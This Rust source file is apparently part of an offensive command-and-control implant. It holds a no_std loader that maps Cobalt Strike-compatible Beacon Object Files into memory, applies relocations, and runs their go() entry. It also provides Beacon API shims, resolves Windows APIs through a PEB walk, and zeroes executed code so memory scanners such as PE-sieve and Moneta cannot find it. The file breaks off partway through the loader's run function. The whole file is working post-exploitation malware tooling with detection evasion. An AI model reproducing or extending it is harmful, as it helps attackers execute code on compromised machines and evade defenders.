//! no_std BOF (Beacon Object File) loader for the Windows PIC implant.
//!
//! Parses a CS-compatible x86_64 COFF `.o`, maps its sections with **W^X**
//! (`.text` → RX after copy+reloc, data → RW — never RWX simultaneously),
//! resolves the CS Beacon-API externals against in-Rust shim functions, and
//! calls the `go()` entry. Captured output is returned as a
//! [`Response::BofOutput`].
//!
//! This is the no_std twin of `crates/bof-runner/src/win.rs` (which is std +
//! links a C shim). The PIC implant can't use the std runner, so the loader is
//! ported here using the implant's own primitives:
//! - `VirtualAlloc` / `VirtualProtect` resolved via the PEB walk (not extern
//!   blocks), the same pattern as `syscalls.rs`/`blind.rs`.
//! - The Beacon-API shim is Rust `#[no_mangle] extern "C" fn` (no libc
//!   `vsnprintf` — a hand-rolled `%s`/`%d`/`%x`/`%c` formatter covers >99% of
//!   community BOF output).
//!
//! # W^X
//!
//! `win.rs` mapped every section as one `PAGE_EXECUTE_READWRITE` blob (audit
//! #3, CRITICAL). Here each section is allocated `PAGE_READWRITE`, its raw
//! bytes are copied, relocations are applied (while still RW), and only THEN
//! are code sections (`Characteristics & IMAGE_SCN_MEM_EXECUTE`) flipped to
//! `PAGE_EXECUTE_READ` via `VirtualProtect`. Data sections stay RW. At the
//! moment `go()` is transmuted, no page is W+X.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use core::ffi::c_void;
use core::ptr;
use nyx_coff::{apply, parse, SymbolResolver};
use nyx_protocol::Response;
// `vec!` macro re-export lives in crate::heap; the bare `vec` import below is
// unused (we use the Vec type directly), so don't pull it in.

// ---- Win32 constants ----

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
/// `MEM_RELEASE` — passed to `VirtualFree` to release a whole region back to the
/// OS. With this flag `dwSize` must be 0 and `lpAddress` the allocation base.
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
/// Kept for reference / future use (the brief RWX write-window flag). The
/// loader below uses PAGE_READWRITE then PAGE_EXECUTE_READ (true W^X), so this
/// constant is currently unused — but documents the Win32 protection value.
#[allow(dead_code)]
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_SIZE: usize = 0x1000;

/// `IMAGE_SCN_MEM_EXECUTE` — marks a code section (.text).
const SCN_MEM_EXECUTE: u32 = 0x2000_0000;

type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
/// `BOOL VirtualFree(LPVOID, SIZE_T, DWORD)`. Counterpart of `VirtualAlloc` —
/// used by [`SectionAlloc`] to release BOF section regions after `go()` runs.
/// `MEM_RELEASE` with `dwSize=0` frees the whole region.
type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;

unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
    Some(core::mem::transmute(a))
}
unsafe fn virtual_protect() -> Option<VirtualProtectFn> {
    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
    Some(core::mem::transmute(a))
}
unsafe fn virtual_free() -> Option<VirtualFreeFn> {
    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree")?;
    Some(core::mem::transmute(a))
}

fn page(n: usize) -> usize {
    (n + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
}

/// VirtualQuery-backed readability probe (selftest diagnostics only): true if
/// [addr, addr+len) lies in a single MEM_COMMIT region whose protection allows
/// reads. Used to guard raw-pointer derefs in the BOF boundary tracer so a
/// wild relocation target reports status bits instead of AV'ing the probe.
#[cfg(feature = "selftest")]
unsafe fn vq_readable(addr: usize, len: usize) -> bool {
    type VirtualQueryFn =
        unsafe extern "system" fn(*const c_void, *mut u8, usize) -> usize;
    let Some(a) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualQuery") else {
        return false;
    };
    let vq: VirtualQueryFn = core::mem::transmute(a);
    // MEMORY_BASIC_INFORMATION (x64) = 48 bytes.
    let mut mbi = [0u8; 48];
    let got = vq(addr as *const c_void, mbi.as_mut_ptr(), mbi.len());
    if got == 0 {
        return false;
    }
    let base = u64::from_le_bytes(mbi[0..8].try_into().unwrap_or_default()) as usize;
    let region_size = u64::from_le_bytes(mbi[24..32].try_into().unwrap_or_default()) as usize;
    let state = u32::from_le_bytes(mbi[32..36].try_into().unwrap_or_default());
    let protect = u32::from_le_bytes(mbi[36..40].try_into().unwrap_or_default());
    const MEM_COMMIT: u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;
    const PAGE_GUARD: u32 = 0x100;
    if state != MEM_COMMIT || protect == PAGE_NOACCESS || (protect & PAGE_GUARD) != 0 {
        return false;
    }
    addr >= base && addr.saturating_add(len) <= base.saturating_add(region_size)
}

// ============================================================================
// Beacon-API shim: output capture buffer + the functions a CS BOF calls.
//
// Output is captured into a static buffer (single-threaded beacon loop — no
// locking). The CS ABI is C calling convention; on x64 the first 4 integer
// args land in rcx/rdx/r8/r9, varargs beyond that on the stack. We only need
// a minimal printf subset.
// ============================================================================

/// Capture buffer size. Matches the std runner's 16 KiB.
const OUT_CAP: usize = 16 * 1024;
static mut OUT: [u8; OUT_CAP] = [0; OUT_CAP];
static mut OUT_LEN: usize = 0;

/// Diagnostic: incremented on every BeaconPrintf entry. Read by
/// `nyx_selftest_bof_trace` to tell "BOF never reached the shim" apart from
/// "shim ran but produced no output".
static mut PRINTF_HITS: u64 = 0;

/// Read the BeaconPrintf hit counter (selftest diagnostics only).
#[cfg(feature = "selftest")]
pub unsafe fn printf_hits() -> u64 {
    PRINTF_HITS
}

/// Read the current capture length (selftest diagnostics only).
#[cfg(feature = "selftest")]
pub unsafe fn capture_len() -> usize {
    OUT_LEN
}

/// Loader boundary trace (selftest diagnostics only): captured inside `run`
/// right before `go()` is called. TRACE_NUMS = [n_sections, base0..3,
/// entry_addr, beaconprintf_addr, lea_target]; TRACE_BYTES = [entry 16B,
/// lea disp32 4B, call disp32 4B, bytes at lea_target 8B].
#[cfg(feature = "selftest")]
pub static mut TRACE_NUMS: [u64; 8] = [0; 8];
#[cfg(feature = "selftest")]
pub static mut TRACE_BYTES: [u8; 32] = [0; 32];

/// Per-BOF args blob (CS beacon.h packing), set by the loader before `go()`.
/// BeaconDataParse(NULL, 0) reads from this.
static mut ARGS_PTR: *const u8 = core::ptr::null();
static mut ARGS_LEN: usize = 0;

unsafe fn out_push(bytes: &[u8]) {
    if OUT_LEN >= OUT_CAP {
        return;
    }
    let room = OUT_CAP - OUT_LEN;
    let n = bytes.len().min(room);
    ptr::copy_nonoverlapping(bytes.as_ptr(), (&raw mut OUT).cast::<u8>().add(OUT_LEN), n);
    OUT_LEN += n;
}

unsafe fn out_push_str(s: &str) {
    out_push(s.as_bytes());
}

/// Reset the capture buffer + args. Called by the loader before invoking `go()`.
pub unsafe fn reset_capture() {
    OUT_LEN = 0;
    if OUT_CAP > 0 {
        OUT[0] = 0;
    }
    ARGS_PTR = core::ptr::null();
    ARGS_LEN = 0;
}

/// Read the captured output as bytes (caller copies before the next BOF runs).
pub unsafe fn captured_output() -> &'static [u8] {
    core::slice::from_raw_parts((&raw const OUT).cast::<u8>(), OUT_LEN)
}

// ---- minimal varargs printf (%s, %d, %x, %c, %%) ----
//
// On Win64 the va_list is: rcx(type), rdx(fmt), r8(arg1), r9(arg2), then the
// rest on the stack at [rsp+0x28], [rsp+0x30], ... (8-byte slots, after the
// 32-byte shadow space). We model the first 4 inline args + read the rest from
// a pointer the caller passes. Since Rust can't take a real va_list, the shim
// signature takes the fmt + up to 6 explicit args; community BOFs almost never
// exceed 6 format args.
/// The varargs payload after `(type, fmt)`. Public because it appears in the
/// [`BeaconPrintf`] signature.
#[repr(C)]
pub struct VaArgs {
    // The 6 args after (type, fmt). On x64 these are r8..r9 + stack.
    pub a1: u64,
    pub a2: u64,
    pub a3: u64,
    pub a4: u64,
    pub a5: u64,
    pub a6: u64,
}

/// CS Beacon callback type tags (subset). CALLBACK_OUTPUT is the normal-output
/// tag; currently the shim treats anything != CALLBACK_ERROR as output.
#[allow(dead_code)]
const CALLBACK_OUTPUT: i32 = 0x0;
const CALLBACK_ERROR: i32 = 0x0d;

unsafe fn format_into(fmt: &[u8], va: &VaArgs) {
    let args = [va.a1, va.a2, va.a3, va.a4, va.a5, va.a6];
    let mut ai = 0usize;
    let mut i = 0usize;
    while i < fmt.len() {
        let c = fmt[i];
        if c != b'%' {
            out_push(&[c]);
            i += 1;
            continue;
        }
        i += 1;
        if i >= fmt.len() {
            out_push(b"%");
            break;
        }
        match fmt[i] {
            b's' => {
                if ai < args.len() {
                    let p = args[ai] as *const u8;
                    if !p.is_null() {
                        let mut len = 0usize;
                        while *p.add(len) != 0 && len < 4096 {
                            len += 1;
                        }
                        out_push(core::slice::from_raw_parts(p, len));
                    }
                    ai += 1;
                }
            }
            b'd' | b'i' => {
                if ai < args.len() {
                    let v = args[ai] as i32;
                    let mut buf = [0u8; 12];
                    let s = itoa(v, &mut buf);
                    out_push(s.as_bytes());
                    ai += 1;
                }
            }
            b'x' => {
                if ai < args.len() {
                    let v = args[ai] as u32;
                    let mut buf = [0u8; 9];
                    let s = utohex(v, &mut buf);
                    out_push(s.as_bytes());
                    ai += 1;
                }
            }
            b'c' => {
                if ai < args.len() {
                    out_push(&[args[ai] as u8]);
                    ai += 1;
                }
            }
            b'%' => out_push(b"%"),
            other => {
                // Unknown specifier: emit literally so the output is debuggable.
                out_push(&[b'%', other]);
            }
        }
        i += 1;
    }
}

/// Signed-decimal into `buf`, returns the written slice.
fn itoa(mut v: i32, buf: &mut [u8; 12]) -> &str {
    // Handle i32::MIN specially to avoid overflow on negation.
    if v == i32::MIN {
        const MIN_STR: &[u8] = b"-2147483648";
        buf[..MIN_STR.len()].copy_from_slice(MIN_STR);
        return core::str::from_utf8(&buf[..MIN_STR.len()]).unwrap_or("");
    }
    let mut tmp = [0u8; 12];
    let mut n = 0usize;
    let neg = v < 0;
    if neg {
        v = -v;
    }
    if v == 0 {
        tmp[0] = b'0';
        n = 1;
    } else {
        while v != 0 {
            tmp[n] = b'0' + (v % 10) as u8;
            n += 1;
            v /= 10;
        }
    }
    let mut out = 0usize;
    if neg {
        buf[0] = b'-';
        out = 1;
    }
    for k in 0..n {
        buf[out + k] = tmp[n - 1 - k];
    }
    let end = out + n;
    core::str::from_utf8(&buf[..end]).unwrap_or("")
}

/// Lowercase hex into `buf`, returns the written slice (no leading 0x).
fn utohex(mut v: u32, buf: &mut [u8; 9]) -> &str {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut tmp = [0u8; 8];
    let mut n = 0usize;
    if v == 0 {
        tmp[0] = b'0';
        n = 1;
    } else {
        while v != 0 {
            tmp[n] = HEX[(v & 0xf) as usize];
            n += 1;
            v >>= 4;
        }
    }
    for k in 0..n {
        buf[k] = tmp[n - 1 - k];
    }
    core::str::from_utf8(&buf[..n]).unwrap_or("")
}

// ---- Beacon ABI functions (resolved by the loader as externals) ----
//
// These are `extern "C"` (the CS ABI is __cdecl = default on x64) and
// `#[no_mangle]` so their names survive to the symbol table the loader keys on.

/// `void BeaconPrintf(int type, const char *fmt, ...)`.
/// Captures formatted output into the static buffer.
///
/// CRITICAL ABI note: the CS ABI is C-calling-convention varargs. Rust can't
/// take a real `va_list` in a stable `extern "C"` fn, so we model the varargs
/// as EXPLICIT trailing args (a1..a6). On Win64 these land in r8 (a1), r9 (a2),
/// then the stack — exactly where a C vararg caller placed them. We must NOT
/// take a struct-by-value here: a >16-byte struct would be passed by hidden
/// pointer (caller-allocates + pointer in r8), which a C vararg caller does
/// NOT do — that mismatch was the segfault (the BOF put `42` in r8 as the 1st
/// vararg, but the old signature read r8 as a pointer to a 48-byte VaArgs and
/// dereferenced garbage). Explicit i64 args match the C vararg register/stack
/// layout, and format_into only consumes as many as the format string refs.
#[no_mangle]
pub unsafe extern "C" fn BeaconPrintf(
    typ: i32,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
) {
    // Diagnostic counter (see nyx_selftest_bof_trace): proves the BOF's call
    // actually reached this shim — distinguishes "relocation sent the call
    // elsewhere" from "shim ran but capture is broken".
    unsafe { PRINTF_HITS += 1 };
    if fmt.is_null() {
        return;
    }
    // Read the C string up to NUL (cap at a sane length).
    let mut len = 0usize;
    while *fmt.add(len) != 0 && len < 1024 {
        len += 1;
    }
    let fmt_bytes = core::slice::from_raw_parts(fmt, len);
    if typ == CALLBACK_ERROR {
        out_push_str("[error] ");
    }
    let va = VaArgs {
        a1,
        a2,
        a3,
        a4,
        a5,
        a6,
    };
    format_into(fmt_bytes, &va);
    out_push(b"\n");
}

/// `void BeaconOutput(int type, char *data, int len)`. Raw-blob sibling of
/// Printf; appends `data[0..len]` to the same capture buffer.
#[no_mangle]
pub unsafe extern "C" fn BeaconOutput(_typ: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    out_push(core::slice::from_raw_parts(data, len as usize));
}

/// CS `datap` parse state. We expose it as a plain struct the BOF stack-allocates.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct DataParseState {
    pub original: *const u8,
    pub buffer: *const u8,
    pub size: i32,
    pub lengths: i32,
}

/// `void BeaconDataParse(datap *parser, char *buffer, int size)`.
/// If `buffer` is NULL, default to the loader-provided args blob.
#[no_mangle]
pub unsafe extern "C" fn BeaconDataParse(d: *mut DataParseState, buffer: *const u8, size: i32) {
    if d.is_null() {
        return;
    }
    let (buf, sz) = if buffer.is_null() {
        (ARGS_PTR as *const u8, ARGS_LEN as i32)
    } else {
        (buffer, size)
    };
    (*d).original = buf;
    (*d).buffer = buf;
    (*d).size = sz;
    (*d).lengths = 0;
}

/// `char *BeaconDataExtract(datap *parser, int *size)`. Reads a u32 length then
/// that many bytes; advances the buffer cursor.
#[no_mangle]
pub unsafe extern "C" fn BeaconDataExtract(d: *mut DataParseState, size: *mut i32) -> *const u8 {
    if d.is_null() || (*d).buffer.is_null() || (*d).original.is_null() {
        if !size.is_null() {
            *size = 0;
        }
        return core::ptr::null();
    }
    let consumed = (*d).buffer as usize - (*d).original as usize;
    let left = (*d).size - consumed as i32;
    if left < 4 {
        if !size.is_null() {
            *size = 0;
        }
        return core::ptr::null();
    }
    let len = *((*d).buffer as *const i32);
    if len < 0 {
        // Negative length is malformed (attacker-controlled i32).
        if !size.is_null() {
            *size = 0;
        }
        return core::ptr::null();
    }
    // Bounds check in usize to avoid i32 overflow: when `len` ≈ i32::MAX the
    // old `left < 4 + len` wrapped negative and bypassed the guard → OOB read.
    // `left >= 4` is already established above, so it's a safe positive i32.
    let len_u = len as usize;
    let need = 4usize.checked_add(len_u).unwrap_or(usize::MAX);
    if need > left as usize {
        if !size.is_null() {
            *size = 0;
        }
        return core::ptr::null();
    }
    let p = (*d).buffer.add(4);
    (*d).buffer = p.add(len_u);
    if !size.is_null() {
        *size = len;
    }
    p
}

/// `int BeaconGetInt(datap *parser)` — read a 4-byte LE int, advance.
#[no_mangle]
pub unsafe extern "C" fn BeaconGetInt(d: *mut DataParseState) -> i32 {
    if d.is_null() || (*d).buffer.is_null() || (*d).original.is_null() {
        return 0;
    }
    let consumed = (*d).buffer as usize - (*d).original as usize;
    let left = (*d).size - consumed as i32;
    if left < 4 {
        return 0;
    }
    let v = *((*d).buffer as *const i32);
    (*d).buffer = (*d).buffer.add(4);
    v
}

/// `short BeaconGetShort(datap *parser)` — read a 2-byte LE short, advance.
#[no_mangle]
pub unsafe extern "C" fn BeaconGetShort(d: *mut DataParseState) -> i16 {
    if d.is_null() || (*d).buffer.is_null() || (*d).original.is_null() {
        return 0;
    }
    let consumed = (*d).buffer as usize - (*d).original as usize;
    let left = (*d).size - consumed as i32;
    if left < 2 {
        return 0;
    }
    let v = *((*d).buffer as *const i16);
    (*d).buffer = (*d).buffer.add(2);
    v
}

/// `char *BeaconGetStr(datap *parser)` — read a NUL-terminated string, advance.
#[no_mangle]
pub unsafe extern "C" fn BeaconGetStr(d: *mut DataParseState) -> *const u8 {
    if d.is_null() || (*d).buffer.is_null() || (*d).original.is_null() {
        return core::ptr::null();
    }
    let consumed = (*d).buffer as usize - (*d).original as usize;
    let left = (*d).size - consumed as i32;
    if left <= 0 {
        return core::ptr::null();
    }
    let mut len = 0usize;
    while len < left as usize && *(*d).buffer.add(len) != 0 {
        len += 1;
        if len > 4096 {
            break;
        }
    }
    if len >= left as usize {
        return core::ptr::null();
    }
    let p = (*d).buffer;
    (*d).buffer = (*d).buffer.add(len + 1);
    p
}

/// `int BeaconDataInt(datap *parser)` — read a 4-byte LE int, advance.
/// Sibling of [`BeaconGetInt`] that takes a `datap` (CS aliases the two names).
#[no_mangle]
pub unsafe extern "C" fn BeaconDataInt(d: *mut DataParseState) -> i32 {
    BeaconGetInt(d)
}

/// `short BeaconDataShort(datap *parser)` — read a 2-byte LE short, advance.
#[no_mangle]
pub unsafe extern "C" fn BeaconDataShort(d: *mut DataParseState) -> i16 {
    BeaconGetShort(d)
}

/// `int BeaconDataLength(datap *parser)` — bytes remaining in the buffer.
#[no_mangle]
pub unsafe extern "C" fn BeaconDataLength(d: *mut DataParseState) -> i32 {
    if d.is_null() || (*d).buffer.is_null() || (*d).original.is_null() {
        return 0;
    }
    let consumed = (*d).buffer as usize - (*d).original as usize;
    (*d).size - (consumed as i32)
}

/// `BOOL BeaconIsAdmin()` — delegate to the hostinfo token-elevation check.
/// Returns 1 if the implant is running elevated, else 0.
#[no_mangle]
pub unsafe extern "C" fn BeaconIsAdmin() -> i32 {
    crate::hostinfo::is_admin() as i32
}

/// `char *BeaconGetSpawnTo(BOOL x86)` — return a writable "cmd.exe" buffer the
/// BOF can pass to CreateProcess. The buffer is static so it persists across
/// the call (CS's contract: the pointer is valid until the BOF returns). The
/// `x86` arg selects an x86 path in future builds; v1 always returns the native
/// cmd.exe.
///
/// CRITICAL: the buffer must be WRITABLE — community BOFs commonly mutate the
/// spawn-to path to splice command-line arguments. A `static &[u8]` would back
/// the slice in read-only `.rdata` and AV on write; this uses a `static mut`
/// `[u8; N]` (`.data`, writable). Re-initialize on each call so a BOF that
/// scribbled args last time doesn't see stale garbage.
#[no_mangle]
pub unsafe extern "C" fn BeaconGetSpawnTo(_x86: i32) -> *mut u8 {
    // Writable static buffer (lives in .data, not .rdata). 2048 bytes — room
    // for the template (~28) + BOF-appended " /c <cmd>" without overflowing
    // into adjacent statics. Re-stamped each call so a prior BOF's mutations
    // don't leak into the next caller.
    static mut SPAWN: [u8; SPAWN_CAP] = [0; SPAWN_CAP];
    const SPAWN_CAP: usize = 2048;
    const TEMPLATE: &[u8] = b"C:\\Windows\\System32\\cmd.exe\0";
    // SAFETY: single-threaded (beacon loop); SPAWN is only touched here.
    // Bounds check: truncate to SPAWN capacity if the template somehow grew.
    let copy_len = if TEMPLATE.len() > SPAWN_CAP {
        SPAWN_CAP
    } else {
        TEMPLATE.len()
    };
    unsafe {
        core::ptr::copy_nonoverlapping(
            TEMPLATE.as_ptr(),
            core::ptr::addr_of_mut!(SPAWN).cast::<u8>(),
            copy_len,
        );
        core::ptr::addr_of_mut!(SPAWN).cast::<u8>()
    }
}

/// `void BeaconRevertToken()` — drop any impersonation, revert to self.
/// v1: the implant doesn't yet maintain an impersonation handle (the postex
/// token module is planned), so this is a documented no-op that lets a BOF
/// referencing it load and run without an unresolved-symbol failure.
#[no_mangle]
pub unsafe extern "C" fn BeaconRevertToken() {}

/// `void BeaconCleanupProcess(PROCESS_INFORMATION *p)` — close the handles in a
/// PROCESS_INFORMATION a BOF got from BeaconSpawnTemporaryProcess. v1 closes
/// hProcess + hThread via the resolved CloseHandle (best-effort).
#[no_mangle]
pub unsafe extern "C" fn BeaconCleanupProcess(pi: *mut core::ffi::c_void) {
    if pi.is_null() {
        return;
    }
    // PROCESS_INFORMATION layout (Win64): HANDLE hProcess, hThread; DWORD pid, tid.
    // Offsets 0 and 8 are the two handles.
    type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
        let close: CloseHandle = core::mem::transmute(addr);
        let base = pi as *const usize;
        let h_proc = *base;
        let h_thread = *base.add(1);
        if h_proc != 0 {
            let _ = close(h_proc as *mut core::ffi::c_void);
        }
        if h_thread != 0 {
            let _ = close(h_thread as *mut core::ffi::c_void);
        }
    }
}

/// `void BeaconInformation(beaconInfo *info)` — fill a small struct with
/// implant metadata (pid, user, host, arch, is_admin). The CS struct layout
/// varies; v1 writes a minimal {pid, is_admin} prefix and leaves the rest for a
/// documented future extension once the full struct is pinned down.
#[repr(C)]
pub struct BeaconInfo {
    pub pid: u32,
    pub is_admin: i32,
}
#[no_mangle]
pub unsafe extern "C" fn BeaconInformation(info: *mut BeaconInfo) {
    if info.is_null() {
        return;
    }
    (*info).pid = crate::hostinfo::pid();
    (*info).is_admin = crate::hostinfo::is_admin() as i32;
}

// ============================================================================
// Symbol resolver: defined (in-image) symbols first, then Beacon-API externals.
// ============================================================================

struct BofResolver<'a> {
    /// (name, addr) for symbols defined within the mapped BOF sections.
    defined: &'a [(String, u64)],
}

impl<'a> SymbolResolver for BofResolver<'a> {
    fn resolve(&self, name: &str) -> Option<u64> {
        // Defined symbols first.
        for (n, addr) in self.defined {
            if n.as_str() == name {
                return Some(*addr);
            }
        }
        // Then the Beacon-API shim table (resolved by name → shim fn pointer).
        beacon_api_addr(name)
    }
}

/// Map a Beacon-API external name to the address of our Rust shim. Extend as
/// more of the ABI lands.
///
/// Function items coerce to their concrete function-pointer type, and any
/// function pointer casts to `usize` via `as` — so we go through `*const ()`
/// (a thin pointer) to dodge spelling out each shim's full signature.
fn beacon_api_addr(name: &str) -> Option<u64> {
    /// fn-item → u64 address. Takes a typed fn pointer; the caller coerces the
    /// fn item by naming its type via a closure.
    fn addr_of(f: *const ()) -> u64 {
        f as u64
    }
    let addr: u64 = match name {
        "BeaconPrintf" => addr_of(BeaconPrintf as *const ()),
        "BeaconOutput" => addr_of(BeaconOutput as *const ()),
        "BeaconDataParse" => addr_of(BeaconDataParse as *const ()),
        "BeaconDataExtract" => addr_of(BeaconDataExtract as *const ()),
        "BeaconGetInt" => addr_of(BeaconGetInt as *const ()),
        "BeaconGetShort" => addr_of(BeaconGetShort as *const ()),
        "BeaconGetStr" => addr_of(BeaconGetStr as *const ()),
        "BeaconDataInt" => addr_of(BeaconDataInt as *const ()),
        "BeaconDataShort" => addr_of(BeaconDataShort as *const ()),
        "BeaconDataLength" => addr_of(BeaconDataLength as *const ()),
        "BeaconIsAdmin" => addr_of(BeaconIsAdmin as *const ()),
        "BeaconGetSpawnTo" => addr_of(BeaconGetSpawnTo as *const ()),
        "BeaconRevertToken" => addr_of(BeaconRevertToken as *const ()),
        "BeaconCleanupProcess" => addr_of(BeaconCleanupProcess as *const ()),
        "BeaconInformation" => addr_of(BeaconInformation as *const ()),
        _ => return None,
    };
    Some(addr)
}

/// Allocate `sz` bytes within ±2 GiB of `anchor` so REL32 relocations from the
/// BOF to the implant image (Beacon-API shims) don't overflow. VirtualAlloc
/// with a non-null lpAddress only succeeds if the region is free; we probe
/// downward from `anchor - step` in 1 MiB steps (staying above anchor-2GiB),
/// then fall back to a null hint if nothing near grants.
///
/// # Safety
/// `alloc` must be the resolved kernel32 VirtualAlloc.
unsafe fn alloc_near(alloc: VirtualAllocFn, anchor: usize, sz: usize) -> *mut c_void {
    const PAGE: usize = 0x1000;
    const STEP: usize = 1 << 20; // 1 MiB probe stride
    const WINDOW: usize = (2u64 << 30) as usize; // 2 GiB REL32 reach
                                                 // Start probing just below the anchor, walking down.
    let mut hint = (anchor & !(PAGE - 1)).saturating_sub(STEP);
    let floor = anchor.saturating_sub(WINDOW);
    let mut tries = 0;
    while hint > floor && tries < 64 {
        let p = alloc(
            hint as *mut c_void,
            sz,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if !p.is_null() {
            return p;
        }
        hint = hint.saturating_sub(STEP);
        tries += 1;
    }
    // Fall back to the kernel's choice (REL32 may overflow, but at least we
    // return a region rather than failing outright).
    alloc(
        ptr::null_mut(),
        sz,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )
}

// ============================================================================
// RAII guard: tracks each VirtualAlloc'd section so EVERY return path (alloc
// failure mid-loop, reloc error, VirtualProtect -> RX failure, missing `go`,
// the normal post-`go()` return) frees + zeroes the section regions. Without
// this every BOF execution permanently leaked all section allocations (~36 MiB
// at 1 BOF/min) and left the RX pages holding relocated .text — a prime
// forensic target for PE-sieve/Moneta. The guard's Drop zeroes each region
// (RW, never the live RX mapping) then releases it with VirtualFree.
// ============================================================================

/// One mapped BOF section: base, page-rounded size, and whether step 4 flipped
/// it RX (so we flip it back to RW before zeroing — writing RX faults).
#[derive(Clone, Copy)]
struct SectionAlloc {
    base: u64,
    size: usize,
    is_rx: bool,
}

/// RAII owner of the section regions. On drop: for each section, flip RX→RW if
/// needed, RtlZeroMemory it, then VirtualFree(MEM_RELEASE). Best-effort — a
/// missing VirtualFree/VirtualProtect export logs a diag mark and continues, so
/// a partial-cleanup run still frees everything it can.
struct SectionGuard {
    sections: Vec<SectionAlloc>,
    free: VirtualFreeFn,
    protect: VirtualProtectFn,
}

impl SectionGuard {
    /// Release ownership back to the caller (disarm the guard) once it has
    /// successfully freed — currently unused but keeps the Drop-after-cleanup
    /// pattern explicit. (The normal path goes through `Drop`.)
    #[allow(dead_code)]
    fn disarm(mut self) -> Vec<SectionAlloc> {
        core::mem::take(&mut self.sections)
    }
}

impl Drop for SectionGuard {
    fn drop(&mut self) {
        // SAFETY: the section regions were VirtualAlloc'd by us (same primitive
        // as `free`); the beacon is single-threaded so there's no race. We zero
        // while writable (RX flipped back to RW first) BEFORE releasing, so no
        // byte of relocated BOF code/data survives in the page cache. The guard
        // runs after `go()` has returned (see `run`), so no shim holds a live
        // pointer into these regions.
        for s in &self.sections {
            if s.base == 0 {
                continue;
            }
            unsafe {
                let p = s.base as *mut c_void;
                // RX sections were flipped to PAGE_EXECUTE_READ in step 4 —
                // writing them now would fault, so flip back to RW first.
                if s.is_rx {
                    let mut old: u32 = 0;
                    if (self.protect)(p, s.size, PAGE_READWRITE, &mut old) == 0 {
                        // VirtualProtect failed (shouldn't happen for our own
                        // region); skip the zero but still attempt the free.
                        crate::entry::diag_mark(b"WARN_BOF_REPROTECT_RW");
                    } else {
                        RtlZeroMemory(p, s.size);
                    }
                } else {
                    RtlZeroMemory(p, s.size);
                }
                // MEM_RELEASE releases the entire region; dwSize MUST be 0 and
                // lpAddress must be the allocation base — which `base` is (it's
                // exactly what VirtualAlloc returned in `alloc_near`).
                if (self.free)(p, 0, MEM_RELEASE) == 0 {
                    crate::entry::diag_mark(b"WARN_BOF_SECTION_FREE");
                }
            }
        }
    }
}

/// `void RtlZeroMemory(PVOID, SIZE_T)` — fill a region with zeros. Backed by
/// the kernel32 `RtlZeroMemory` export when present; otherwise a hand-rolled
/// zero loop. Used by [`SectionGuard`] to wipe a section's bytes before freeing
/// them so no relocated BOF code/data survives for a memory scanner to find.
#[allow(non_snake_case)]
unsafe fn RtlZeroMemory(ptr: *mut c_void, len: usize) {
    // kernel32 exports RtlZeroMemory (a memset-0 wrapper) on modern Windows.
    // Fall back to a hand-rolled zero loop so a missing export still wipes the
    // region.
    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"RtlZeroMemory") {
        type RtlZero = unsafe extern "system" fn(*mut c_void, usize);
        let f: RtlZero = core::mem::transmute(addr);
        f(ptr, len);
        return;
    }
    // Fallback: hand-rolled zero. SAFETY: caller guarantees [ptr, ptr+len) is a
    // valid writable region we own.
    let bytes = core::slice::from_raw_parts_mut(ptr as *mut u8, len);
    for b in bytes.iter_mut() {
        *b = 0;
    }
}

// ============================================================================
// Loader: parse → W^X map → reloc → resolve entry → call.
// ============================================================================

/// Pack a `Vec<String>` of args into the CS beacon.h wire format so a BOF's
/// `BeaconDataParse`/`BeaconGetStr` can read them.
///
/// CS packs each arg as: `[u32 tag][u32 length][bytes]` (BEACON_ARG_TYPE_STRING
/// = 3). We use that layout so community BOFs that parse args work unchanged.
fn pack_args(args: &[String]) -> Vec<u8> {
    let mut out = Vec::new();
    for a in args {
        out.extend_from_slice(&3u32.to_le_bytes()); // BEACON_ARG_TYPE_STRING
        out.extend_from_slice(&(a.len() as u32).to_le_bytes());
        out.extend_from_slice(a.as_bytes());
    }
    out
}

/// Load + relocate a BOF into W^X memory, then call its `go()` entry. Captured
/// `BeaconPrintf`/`BeaconOutput` output is returned as `Response::BofOutput`.
///
/// On any failure (parse, alloc, reloc, unresolved symbol) returns
/// `Response::Err` with a short diagnostic.
pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
    // `name` is the BOF's logical name (informational); the entry symbol is
    // always `go` per the CS ABI. (Future: allow a custom entry.)
    let _ = name;

    let coff = match parse(blob) {
        Ok(c) => c,
        Err(e) => {
            let mut m = String::from("bof parse: ");
            // Append a coarse diagnostic (no alloc::format! in no_std lean builds).
            m.push_str(match e {
                nyx_coff::CoffError::Truncated => "truncated",
                nyx_coff::CoffError::UnsupportedMachine(_) => "bad machine",
            });
            return Response::Err(m);
        }
    };

    let alloc = match unsafe { virtual_alloc() } {
        Some(f) => f,
        None => return Response::Err(String::from("VirtualAlloc unresolved")),
    };
    let protect = match unsafe { virtual_protect() } {
        Some(f) => f,
        None => return Response::Err(String::from("VirtualProtect unresolved")),
    };
